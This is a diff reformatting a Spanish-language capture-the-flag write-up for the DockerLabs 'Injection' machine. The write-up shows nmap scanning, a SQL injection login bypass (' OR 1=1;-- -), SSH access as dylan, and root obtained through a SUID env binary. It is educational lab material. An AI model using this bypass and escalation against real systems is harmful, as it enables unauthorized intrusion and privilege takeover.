@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Injection
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Injection ​​
+
+## 🖥️ Writeup - Injection
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `SQLi` `Authentication Bypass` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip injection.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh injection.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 16:34 CEST
 Nmap scan report for 172.17.0.2
@@ -86,8 +95,6 @@ Entramos en el puerto `80` y nos encontramos con un panel de inicio de sesión.
 
 Dado que la máquina se llama `injection`, probamos manualmente algunos de los comandos de `SQLi` más comunes.
 
-![alt text](../images/sqli.png)
-
 Funciona a la primera, inyectando el comando `' OR 1=1;-- -` en el campo de usuario y poniendo una contraseña aleatoria.
 
 Una vez dentro, aparece el siguiente mensaje:
@@ -104,7 +111,7 @@ Accedemos por `SSH` con estas credenciales.
 ssh dylan@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
@@ -113,6 +120,7 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/bin/umount
 /usr/bin/chsh
@@ -134,6 +142,7 @@ Comprobamos que podemos ejecutar el binario `env` con privilegios `SUID`, lo cua
 ```
 
 Info:
+
 ```
 # whoami
 root
